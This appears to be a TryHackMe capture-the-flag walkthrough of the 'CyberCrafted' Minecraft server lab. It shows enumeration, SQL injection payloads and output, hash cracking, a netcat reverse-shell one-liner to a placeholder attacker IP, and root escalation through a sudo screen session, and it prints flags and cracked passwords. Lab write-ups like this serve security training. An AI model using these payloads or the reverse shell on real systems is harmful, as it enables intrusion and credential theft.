<p>June 26, 2025</p>
<h1>CyberCrafted</h1>
<p>Pwn this pay-to-win Minecraft server!</p>

![image](https://github.com/user-attachments/assets/05cb49a9-54bf-4e1f-9347-54a86a77505d)


```bash
:~# nmap -sC -sV -O -A -p- -T4 TargetIP
...
PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
...
80/tcp    open  http      Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Did not follow redirect to http://cybercrafted.thm/
25565/tcp open  minecraft Minecraft 1.7.2 (Protocol: 127, Message: ck00r lcCyberCraftedr ck00rrck00r e-TryHackMe-r  ck00r, Users: 0/1)
...
```

```bash
TargetIp  cybercrated.thm
```

```bash
:~# gobuster dir -u http://cybercrafted.thm/ -w raft-medium-directories.txt -t 100 -x php,txt,bak,html
...
/assets               (Status: 301) [Size: 321] [--> http://cybercrafted.thm/assets/]
/index.html           (Status: 200) [Size: 832]
/secret               (Status: 301) [Size: 321] [--> http://cybercrafted.thm/secret/]
/server-status        (Status: 403) [Size: 281]
/.html                (Status: 403) [Size: 281]
/.php                 (Status: 403) [Size: 281]
```

![image](https://github.com/user-attachments/assets/1686b500-91a8-4901-8e91-2335b3bbabbf)

![image](https://github.com/user-attachments/assets/6de62e66-05d3-4a36-be01-840a99041ced)

![image](https://github.com/user-attachments/assets/9f478b26-6fbe-474e-a676-000eb7d5a329)


```bash
:~# gobuster vhost -u cybercrafted.thm -w subdomains-top1million-110000.txt --append-domain -t 80
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://cybercrafted.thm
[+] Method:          GET
[+] Threads:         80
[+] Wordlist:        subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.cybercrafted.thm Status: 200 [Size: 937]
Found: www.admin.cybercrafted.thm Status: 200 [Size: 937]
Found: www.store.cybercrafted.thm Status: 403 [Size: 291]
Found: gc._msdcs.cybercrafted.thm Status: 400 [Size: 301]
Found: store.cybercrafted.thm Status: 403 [Size: 287]
Found: _domainkey.cybercrafted.thm Status: 400 [Size: 301]
Found: ADMIN.cybercrafted.thm Status: 200 [Size: 937]
Found: mailing._domainkey.info.cybercrafted.thm Status: 400 [Size: 301]
Found: mailing._domainkey.sunnynews.cybercrafted.thm Status: 400 [Size: 301]
Found: hallam_ad.cybercrafted.thm Status: 400 [Size: 301]
Found: hallam_dev.cybercrafted.thm Status: 400 [Size: 301]
Found: WM_J_B__Ruffin.cybercrafted.thm Status: 400 [Size: 301]
Found: 2609_N_www.cybercrafted.thm Status: 400 [Size: 301]
Found: 0907_N_hn.m.cybercrafted.thm Status: 400 [Size: 301]
Found: 0507_N_hn.cybercrafted.thm Status: 400 [Size: 301]
Found: faitspare_mbp.cit.cybercrafted.thm Status: 400 [Size: 301]
Found: sb_0601388345bc6cd8.cybercrafted.thm Status: 400 [Size: 301]
Found: sb_0601388345bc450b.cybercrafted.thm Status: 400 [Size: 301]
Found: api_portal_dev.cybercrafted.thm Status: 400 [Size: 301]
Found: api_web_dev.cybercrafted.thm Status: 400 [Size: 301]
Found: api_webi_dev.cybercrafted.thm Status: 400 [Size: 301]
Found: sklep_test.cybercrafted.thm Status: 400 [Size: 301]
Progress: 114532 / 114533 (100.00%)
===============================================================
Finished
===============================================================
```

![image](https://github.com/user-attachments/assets/c82bf909-f213-46dd-85fe-efd93d40a12b)


<p>Target IP cybercrafted.thm admin.cybercrafted.thm store.acybercrafted.thm www.cybercrafted.thm</p>


```bash
:~# gobuster dir -e -u http://admin.cybercrafted.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 80
...
http://admin.cybercrafted.thm/.php                 (Status: 403) [Size: 287]
http://admin.cybercrafted.thm/.html                (Status: 403) [Size: 287]
http://admin.cybercrafted.thm/index.php            (Status: 200) [Size: 937]
http://admin.cybercrafted.thm/login.php            (Status: 302) [Size: 0] [--> /]
http://admin.cybercrafted.thm/assets               (Status: 301) [Size: 333] [--> http://admin.cybercrafted.thm/assets/]
http://admin.cybercrafted.thm/panel.php            (Status: 302) [Size: 0] [--> /]
http://admin.cybercrafted.thm/server-status        (Status: 403) [Size: 287]
```

![image](https://github.com/user-attachments/assets/5729a2a1-5759-4a5d-bb17-ba9bddec0a00)

![image](https://github.com/user-attachments/assets/ae5b06e0-0d15-4828-9d9d-06f2bc65b88b)



```bash
:~# gobuster dir -e -u http://store.cybercrafted.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 80
...
http://store.cybercrafted.thm/.html                (Status: 403) [Size: 287]
http://store.cybercrafted.thm/.php                 (Status: 403) [Size: 287]
http://store.cybercrafted.thm/index.html           (Status: 403) [Size: 287]
http://store.cybercrafted.thm/search.php           (Status: 200) [Size: 838]
http://store.cybercrafted.thm/assets               (Status: 301) [Size: 333] [--> http://store.cybercrafted.thm/assets/]
http://store.cybercrafted.thm/server-status        (Status: 403) [Size: 287]
```

![image](https://github.com/user-attachments/assets/e884c202-7a4c-4e85-b29b-a8e90a2196c5)

![image](https://github.com/user-attachments/assets/f9d06d72-7be3-4fad-b387-a87875f3881f)

![image](https://github.com/user-attachments/assets/21852bd1-1cc5-40ca-ad1e-4e7fb42685f9)

![image](https://github.com/user-attachments/assets/c541420b-a0c2-4b9b-944b-612b25e2b9fb)

![image](https://github.com/user-attachments/assets/e94c52fc-16f0-4e60-b91e-cb527bbd079a)

```bash
:~# sqlmap -r req --dbs
...
[...] [INFO] resuming back-end DBMS 'mysql' 
[...] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=tvXH' AND (SELECT 7203 FROM (SELECT(SLEEP(5)))VjGa) AND 'CNjj'='CNjj&submit=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: search=tvXH' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a706b71,0x7a4645694f796772634a717a73706c4e50617971704d47706978796c574267596973706855545944,0x7170787171)-- -&submit=
---
[...] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
[...] [INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] webapp
```

<p>THM{bbe315906038c3a62d9b195001f75008}</p>

```bash
:~# sqlmap -u http://store.cybercrafted.thm/search.php --forms --dump
...
sqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:
---
Parameter: search (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: search=tvXH' AND (SELECT 7203 FROM (SELECT(SLEEP(5)))VjGa) AND 'CNjj'='CNjj&submit=

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: search=tvXH' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x717a706b71,0x7a4645694f796772634a717a73706c4e50617971704d47706978796c574267596973706855545944,0x7170787171)-- -&submit=

---
do you want to exploit this SQL injection? [Y/n] Y
[04:39:46] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.12
...
[04:40:03] [INFO] writing hashes to a temporary file '/tmp/sqlmapxlvz1hym14942/sqlmaphashes-qkvajyb2.txt' 
...
Database: webapp
Table: admin
[2 entries]
+------+------------------------------------------+---------------------+
| id   | hash                                     | user                |
+------+------------------------------------------+---------------------+
| 4    | THM{bbe315906038c3a62d9b195001f75008}    | web_flag            |
| 1    | 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 | xXUltimateCreeperXx |
+------+------------------------------------------+---------------------+

[04:40:19] [INFO] table 'webapp.`admin`' dumped to CSV file '/root/.sqlmap/output/store.cybercrafted.thm/dump/webapp/admin.csv'
...
Database: webapp
Table: stock
[139 entries]
+------+------------------------+--------+--------+
| id   | item                   | cost   | amount |
+------+------------------------+--------+--------+
| 50   | Chainmail Boots        | 1$     | 1x     |
| 82   | Golden Pickaxe         | 0.5$   | 1x     |
| 114  | Totem of Undying       | 5$     | 1x     |
| 18   | Eye of Ender           | 2$     | 16x    |
| 63   | Diamond Chestplate     | 6$     | 1x     |
| 95   | Lapis Lazuli           | 5$     | 64x    |
| 127  | Ghast Tear             | 10$    | 64x    |
| 31   | Melon Seeds            | 0.8$   | 64x    |
| 44   | Wheat Seeds            | 0.5$   | 64x    |
| 76   | Golden Carrot          | 4$     | 64x    |
| 108  | Saddle                 | 1$     | 1x     |
| 12   | Cocoa Beans            | 0.4$   | 64     |
| 140  | Raw Iron               | 5$     | 64x    |
| 57   | Cooked Mutton          | 1$     | 64x    |
| 89   | Iron Hoe               | 0.5$   | 1x     |
| 121  | Clock                  | 1$     | 1x     |
| 25   | Item Frame             | 0.1$   | 1x     |
| 70   | Diamond Sword          | 4$     | 1x     |
| 102  | Netherite Helmet       | 4$     | 1x     |
| 6    | Beetroot Seeds         | 0.2$   | 16x    |
| 134  | Nether Brick           | 1$     | 64x    |
| 38   | Snowball               | 0.4$   | 16x    |
| 51   | Chainmail Chestplate   | 1.5$   | 1x     |
| 83   | Golden Shovel          | 0.5$   | 1x     |
| 115  | Tropical Fish          | 0.2$   | 1x     |
| 19   | Fire Charge            | 1$     | 16x    |
| 64   | Diamond Helmet         | 2$     | 1x     |
| 96   | Milk Bucket            | 0.2$   | 1x     |
| 128  | Glowstone Dust         | 5$     | 64x    |
| 32   | Minecart               | 0.8$   | 1x     |
| 45   | Arrow                  | 2$     | 64x    |
| 77   | Golden Chestplate      | 2$     | 1x     |
| 109  | Shears                 | 0.5$   | 1x     |
| 13   | Crossbow               | 0.5$   | 1x     |
| 141  | Shulker Shell          | 2$     | 16x    |
| 58   | Cooked Porkchop        | 1$     | 64x    |
| 90   | Iron Horse Armor       | 2$     | 1x     |
| 122  | Coal                   | 3$     | 64x    |
| 26   | Jungle Boat            | 0.5$   | 1x     |
| 71   | Elytra                 | 8$     | 1x     |
| 103  | Netherite Hoe          | 6      | 1x     |
| 7    | Birch Boat             | 0.5$   | 1x     |
| 135  | Nether Quartz          | 8$     | 64x    |
| 39   | Splash Potion          | 0.1$   | 1x     |
| 52   | Chainmail Helmet       | 1$     | 1x     |
| 84   | Golden Sword           | 0.5$   | 1x     |
| 116  | Turtle Shell           | 4$     | 16x    |
| 20   | Firework Rocket        | 0.8$   | 16x    |
| 65   | Diamond Hoe            | 1$     | 1x     |
| 97   | Mushroom Stew          | 1$     | 16x    |
| 129  | Gunpowder              | 5$     | 64x    |
| 33   | Nether Wart            | 1$     | 16x    |
| 46   | Bone                   | 1$     | 64x    |
| 78   | Golden Helmet          | 1$     | 1x     |
| 110  | Shield                 | 0.5$   | 1x     |
| 14   | Dark Oak Boat          | 0.5$   | 1x     |
| 142  | Slimeball              | 1$     | 16x    |
| 59   | Cooked Rabbit          | 1$     | 64x    |
| 91   | Iron Leggings          | 2$     | 1x     |
| 123  | Copper Ingot           | 5$     | 64x    |
| 27   | Kelp                   | 0.1$   | 64x    |
| 72   | Enchanted Golden Apple | 150$   | 64x    |
| 104  | Netherite Leggings     | 8$     | 1x     |
| 8    | Bottle of Enchanting   | 1$     | 64x    |
| 136  | Nether Star            | 10$    | 1x     |
| 40   | Spruce Boat            | 0.5$   | 1x     |
| 53   | Chainmail Leggings     | 1.2$   | 1x     |
| 85   | Iron Axe               | 1$     | 1x     |
| 117  | Wheat                  | 2$     | 64x    |
| 21   | Fishing Rod            | 0.2$   | 1x     |
| 66   | Diamond Horse Armor    | 2$     | 1x     |
| 98   | Name Tag               | 4$     | 16x    |
| 130  | Heart of the Sea       | 4$     | 1x     |
| 34   | Oak Boat               | 0.5$   | 1x     |
| 47   | Bone Meal              | 0.4$   | 64x    |
| 79   | Golden Hoe             | 0.5$   | 1x     |
| 111  | Sugar                  | 1$     | 64x    |
| 15   | Egg                    | 0.1$   | 16x    |
| 60   | Cooked Salmon          | 1$     | 64x    |
| 92   | Iron Pickaxe           | 1$     | 1x     |
| 124  | Diamond                | 20$    | 64x    |
| 28   | Lava Bucket            | 0.5$   | 1x     |
| 41   | String                 | 1$     | 64x    |
| 73   | Golden Apple           | 5$     | 64x    |
| 105  | Netherite Pickaxe      | 5$     | 1x     |
| 9    | Bow                    | 0.5$   | 1x     |
| 137  | Netherite Ingot        | 500$   | 64x    |
| 54   | Compass                | 0.5$   | 1x     |
| 86   | Iron Boots             | 1.5$   | 1x     |
| 118  | Amethyst Shard         | 2$     | 16x    |
| 22   | Flint and Steel        | 0.2$   | 1x     |
| 67   | Diamond Leggings       | 5$     | 1x     |
| 99   | Netherite Axe          | 5$     | 1x     |
| 131  | Iron Ingot             | 10$    | 64x    |
| 35   | Painting               | 0.2$   | 1x     |
| 48   | Bowl                   | 0.5$   | 16x    |
| 80   | Golden Horse Armor     | 0.5$   | 1x     |
| 112  | Suspicious Stew        | 4$     | 1x     |
| 16   | End Crystal            | 5$     | 1x     |
| 61   | Diamond Axe            | 2$     | 1x     |
| 93   | Iron Shovel            | 0.8$   | 1x     |
| 125  | Emerald                | 20$    | 64x    |
| 29   | Lead                   | 0.6$   | 1x     |
| 42   | Trident                | 5$     | 1x     |
| 74   | Golden Axe             | 1$     | 1x     |
| 106  | Netherite Shovel       | 5$     | 1x     |
| 10   | Bucket                 | 0.2$   | 1x     |
| 138  | Netherite Scrap        | 50$    | 64x    |
| 55   | Cooked Chicken         | 1$     | 64x    |
| 87   | Iron Chestplate        | 3$     | 1x     |
| 119  | Blaze Powder           | 5$     | 64x    |
| 23   | Glow Berries           | 0.2$   | 16x    |
| 68   | Diamond Pickaxe        | 3$     | 1x     |
| 100  | Netherite Boots        | 6$     | 1x     |
| 4    | Acacia Boat            | 0.5$   | 1x     |
| 132  | Lapis Lazuli           | 2$     | 64x    |
| 36   | Potato                 | 1$     | 64x    |
| 49   | Bread                  | 2$     | 64x    |
| 81   | Golden Leggings        | 0.5$   | 1x     |
| 113  | Tipped Arrow           | 4$     | 16x    |
| 17   | Ender Pearl            | 1$     | 16     |
| 62   | Diamond Boots          | 4$     | 1x     |
| 94   | Iron Sword             | 1$     | 1x     |
| 126  | Flint                  | 2$     | 64x    |
| 30   | Lingering Potion       | 2$     | 16x    |
| 43   | Water Bucket           | 0.5$   | 1x     |
| 75   | Golden Boots           | 2$     | 1x     |
| 107  | Netherite Sword        | 5$     | 1x     |
| 11   | Carrot                 | 0.1$   | 64x    |
| 139  | Raw Gold               | 5$     | 64x    |
| 56   | Cooked Cod             | 1$     | 64x    |
| 88   | Iron Helmet            | 1$     | 1x     |
| 120  | Blaze Rod              | 5$     | 32x    |
| 24   | Glow Item Frame        | 0.1$   | 1x     |
| 69   | Diamond Shovel         | 2$     | 1x     |
| 101  | Netherite Chestplate   | 10$    | 1x     |
| 5    | Armor Stand            | 0.5$   | 1x     |
| 133  | Nautilus Shell         | 2$     | 16x    |
| 37   | Redstone Dust          | 2$     | 64x    |
+------+------------------------+--------+--------+

[04:40:19] [INFO] table 'webapp.stock' dumped to CSV file '/root/.sqlmap/output/store.cybercrafted.thm/dump/webapp/stock.csv'
[04:40:19] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 27 times
[04:40:19] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/root/.sqlmap/output/results-06262025_0438am.csv'
...
```

```bash
lololo' union select 1,2,3,table_name from information_schema.tables #
```

![image](https://github.com/user-attachments/assets/1cafbff5-c913-4dea-892a-8f06e432f0a9)

```bash
lololo' union select 1,2,3,table_name from information_schema.tables where table_schema = 'webapp' # 
```

![image](https://github.com/user-attachments/assets/b33c797d-6370-4c2c-be24-97154281d0c7)

```bash
lololo' union select 1,2,3,column_name from information_schema.columns where table_name='admin' # 
```

![image](https://github.com/user-attachments/assets/d8b4586f-69fa-4d3a-9ad8-aba8ef55ff33)

```bash
lololo' union select 1,2,user,hash from admin # 
```

![image](https://github.com/user-attachments/assets/810121f0-335d-430e-b8c6-42f3408086e8)

```bash
lololo' union select 1,2,3,group_concat(user,0x3a,hash) from webapp.admin # 
```

![image](https://github.com/user-attachments/assets/a37ec45e-d45c-4520-9039-93a70228cbd8)


<p> 2   3  	xXUltimateCreeperXx:88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01,web_flag:THM{bbe315906038c3a62d9b195001f75008}</p>

```bash
:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
...
diamond123456789 (?)
...
Session completed. 
```

<p>xXUltimateCreeperXx:diamond123456789</p>

![image](https://github.com/user-attachments/assets/dce87b64-56d2-4892-a2d9-3dd7aef72d87)


![image](https://github.com/user-attachments/assets/bb29e44f-72ee-4e3c-8651-2be3274a70b2)

![image](https://github.com/user-attachments/assets/020a196a-b649-4d5e-a6bc-fa6743f2102c)

![image](https://github.com/user-attachments/assets/158cbe1b-1ca5-4ba8-b439-36c1b6c8f83f)

<p>rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc AttackIP 4444>f</p>

```bash
:~# nc -nlvp 4444
...
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@cybercrafted:/var/www/admin$ ^Z
[1]+  Stopped                 nc -nlvp 4444
:~# stty raw -echo; fg
nc -nlvp 4444

www-data@cybercrafted:/var/www/admin$
www-data@cybercrafted:/var/www/admin$ cd /home
www-data@cybercrafted:/home$ ls
cybercrafted  xxultimatecreeperxx
www-data@cybercrafted:/home$ cd xxultimatecreeperxx
www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ ls
authorized_keys  id_rsa
www-data@cybercrafted:/home/xxultimatecreeperxx/.ssh$ cat id_rsa
...
```

```bash
:~# python3 /opt/john/ssh2john.py id_rsa > hash
:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash
...
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
...
creepin2006      (id_rsa)
...
Session completed. 
```

```bash
:~# ssh xxultimatecreeperxx@10.10.82.106 -i id_rsa
Enter passphrase for key 'id_rsa': 
xxultimatecreeperxx@cybercrafted:~$ find / -group minecraft 2>/dev/null
/opt/minecraft
/opt/minecraft/note.txt
/opt/minecraft/minecraft_server_flag.txt
/opt/minecraft/cybercrafted
/opt/minecraft/cybercrafted/help.yml
/opt/minecraft/cybercrafted/commands.yml
/opt/minecraft/cybercrafted/world
/opt/minecraft/cybercrafted/world/level.dat_mcr
/opt/minecraft/cybercrafted/world/session.lock
/opt/minecraft/cybercrafted/world/DIM-1
/opt/minecraft/cybercrafted/world/DIM-1/data
/opt/minecraft/cybercrafted/world/DIM-1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM-1/forcedchunks.dat
/opt/minecraft/cybercrafted/world/playerdata
/opt/minecraft/cybercrafted/world/playerdata/77f6b2f8-e83c-458d-9795-6487671ad59f.dat
/opt/minecraft/cybercrafted/world/DIM1
/opt/minecraft/cybercrafted/world/DIM1/data
/opt/minecraft/cybercrafted/world/DIM1/data/villages.dat
/opt/minecraft/cybercrafted/world/DIM1/forcedchunks.dat
/opt/minecraft/cybercrafted/world/data
/opt/minecraft/cybercrafted/world/data/villages_nether.dat
/opt/minecraft/cybercrafted/world/data/villages.dat
/opt/minecraft/cybercrafted/world/data/villages_end.dat
/opt/minecraft/cybercrafted/world/data/Fortress.dat
/opt/minecraft/cybercrafted/world/forcedchunks.dat
/opt/minecraft/cybercrafted/world/uid.dat
/opt/minecraft/cybercrafted/world/stats
/opt/minecraft/cybercrafted/world/stats/_madrins.json
/opt/minecraft/cybercrafted/world/stats/hank20000.json
/opt/minecraft/cybercrafted/world/stats/77f6b2f8-e83c-458d-9795-6487671ad59f.json
/opt/minecraft/cybercrafted/world/players
/opt/minecraft/cybercrafted/world/players/hank20000.dat
/opt/minecraft/cybercrafted/world/players/_madrins.dat
/opt/minecraft/cybercrafted/world/region
/opt/minecraft/cybercrafted/world/region/r.-2.-3.mca
/opt/minecraft/cybercrafted/world/region/r.-1.-2.mca
/opt/minecraft/cybercrafted/world/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world/region/r.-2.-1.mca
/opt/minecraft/cybercrafted/world/region/r.0.0.mca
/opt/minecraft/cybercrafted/world/region/r.-3.0.mca
/opt/minecraft/cybercrafted/world/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world/region/r.-2.0.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-2.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-3.mca
/opt/minecraft/cybercrafted/world/region/r.-3.-1.mca
/opt/minecraft/cybercrafted/world/region/r.-2.-2.mca
/opt/minecraft/cybercrafted/world/region/r.0.-1.mca
/opt/minecraft/cybercrafted/permissions.yml
/opt/minecraft/cybercrafted/server-icon.png
/opt/minecraft/cybercrafted/world_the_end
/opt/minecraft/cybercrafted/world_the_end/session.lock
/opt/minecraft/cybercrafted/world_the_end/DIM1
/opt/minecraft/cybercrafted/world_the_end/DIM1/region
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.0.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world_the_end/DIM1/region/r.0.-1.mca
/opt/minecraft/cybercrafted/world_the_end/data
/opt/minecraft/cybercrafted/world_the_end/uid.dat
/opt/minecraft/cybercrafted/world_the_end/players
/opt/minecraft/cybercrafted/white-list.txt
/opt/minecraft/cybercrafted/craftbukkit-1.7.2-server.jar
/opt/minecraft/cybercrafted/world_nether
/opt/minecraft/cybercrafted/world_nether/session.lock
/opt/minecraft/cybercrafted/world_nether/level.dat_old
/opt/minecraft/cybercrafted/world_nether/DIM-1
/opt/minecraft/cybercrafted/world_nether/DIM-1/region
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.0.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.0.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.-1.-1.mca
/opt/minecraft/cybercrafted/world_nether/DIM-1/region/r.0.-1.mca
/opt/minecraft/cybercrafted/world_nether/level.dat
/opt/minecraft/cybercrafted/world_nether/data
/opt/minecraft/cybercrafted/world_nether/uid.dat
/opt/minecraft/cybercrafted/world_nether/players
/opt/minecraft/cybercrafted/plugins
/opt/minecraft/cybercrafted/plugins/LoginSystem_v.2.4.jar
/opt/minecraft/cybercrafted/plugins/LoginSystem
/opt/minecraft/cybercrafted/plugins/LoginSystem/settings.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/passwords.yml
/opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt
/opt/minecraft/cybercrafted/plugins/LoginSystem/language.yml
/opt/minecraft/cybercrafted/logs
/opt/minecraft/cybercrafted/logs/2021-06-28-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-3.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-5.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-3.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-27-1.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-4.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-2.log.gz
/opt/minecraft/cybercrafted/logs/2021-06-28-1.log.gz
/opt/minecraft/cybercrafted/logs/2021-09-12-1.log.gz
/opt/minecraft/cybercrafted/server.properties
/opt/minecraft/cybercrafted/ops.txt
/opt/minecraft/cybercrafted/bukkit.yml
/opt/minecraft/cybercrafted/banned-ips.txt
/opt/minecraft/cybercrafted/banned-players.txt
```

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ ls
cybercrafted  minecraft_server_flag.txt  note.txt  WorldBackup
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat note.txt
Just implemented a new plugin within the server so now non-premium Minecraft accounts can game too! :)
- cybercrafted

P.S
Will remove the whitelist soon.
```

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cat minecraft_server_flag.txt
THM{ba93767ae3db9f5b8399680040a0c99e}
```

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ ls -lah
total 24K
drwxr-x--- 4 cybercrafted minecraft    4.0K Jun 27  2021 .
drwxr-xr-x 3 root         root         4.0K Jun 27  2021 ..
drwxr-x--- 7 cybercrafted minecraft    4.0K Jun 27  2021 cybercrafted
-rw-r----- 1 cybercrafted minecraft      38 Jun 27  2021 minecraft_server_flag.txt
-rw-r----- 1 cybercrafted minecraft     155 Jun 27  2021 note.txt
drwxr-x--- 2 cybercrafted cybercrafted 4.0K Sep 12  2021 WorldBackup
xxultimatecreeperxx@cybercrafted:/opt/minecraft$ cd cybercrafted
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ ls
banned-ips.txt      commands.yml                  logs             plugins            white-list.txt  world_the_end
banned-players.txt  craftbukkit-1.7.2-server.jar  ops.txt          server-icon.png    world
bukkit.yml          help.yml                      permissions.yml  server.properties  world_nether
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted$ cd plugins
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ ls
LoginSystem  LoginSystem_v.2.4.jar
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins$ cd LoginSystem
```

```bash
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ ls
language.yml  log.txt  passwords.yml  settings.yml
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat passwords.yml
cybercrafted: dcbf543ee264e2d3a32c967d663e979e
madrinch: 42f749ade7f9e195bf475f37a44cafcb
xxultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ cat log.txt

[2021/06/27 11:25:07] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:25:16] cybercrafted registered. PW: JavaEdition>Bedrock
[2021/06/27 11:46:30] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:47:34] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:52:13] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:29] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:57:54] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:38] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:58:46] cybercrafted logged in. PW: JavaEdition>Bedrock
[2021/06/27 11:58:52] [BUKKIT-SERVER] Startet LoginSystem!
[2021/06/27 11:59:01] madrinch logged in. PW: Password123
[2021/10/15 17:13:45] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 20:36:21] [BUKKIT-SERVER] Startet LoginSystem!
[2021/10/15 21:00:43] [BUKKIT-SERVER] Startet LoginSystem!
[2025/06/26 02:29:31] [BUKKIT-SERVER] Startet LoginSystem!
```

```bash
xultimatecreeperxx@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ su cybercrafted
Password: 
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ id
uid=1002(cybercrafted) gid=1002(cybercrafted) groups=1002(cybercrafted)
...
cybercrafted@cybercrafted:cat user.txt
THM{b4aa20aaf08f174473ab0325b24a45ca}
...
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ sudo -l
[sudo] password for cybercrafted: 
Matching Defaults entries for cybercrafted on cybercrafted:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cybercrafted may run the following commands on cybercrafted:
    (root) /usr/bin/screen -r cybercrafted
```

```bash
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ sudo /usr/bin/screen -r cybercrafted
```

<p>CRTL + a<br>
CTRL + c</p>

```bash
cybercrafted@cybercrafted:/opt/minecraft/cybercrafted/plugins/LoginSystem$ sudo /usr/bin/screen -r cybercrafted
```

```bash
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@cybercrafted:/opt/minecraft/cybercrafted# cd /root
root@cybercrafted:~# ls
root.txt
root@cybercrafted:~# cat root.txt
THM{8bb1eda065ceefb5795a245568350a70}
root@cybercrafted:~#

```


![image](https://github.com/user-attachments/assets/9f87a2da-f6a1-44f3-a2c3-be050be119ab)

<br>
<br>

![image](https://github.com/user-attachments/assets/96204399-19f0-4f70-9f62-57447bd489c6)

![image](https://github.com/user-attachments/assets/7dccf70b-1780-4d8a-9468-5e4990ba243b)


<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| June 25, 2025     | 416      |     179ᵗʰ    |      5ᵗʰ     |     258ᵗʰ   |     6ᵗʰ    |  110,591 |    803   |     63    |

</div>

![image](https://github.com/user-attachments/assets/c8d3087d-e765-4e77-97bc-2c592a6c90cf)

![image](https://github.com/user-attachments/assets/d3b764fe-b6bb-4123-b2c3-9fd051e96f48)

![image](https://github.com/user-attachments/assets/f9c35247-6303-494c-bac3-5d392d0ed6ec)

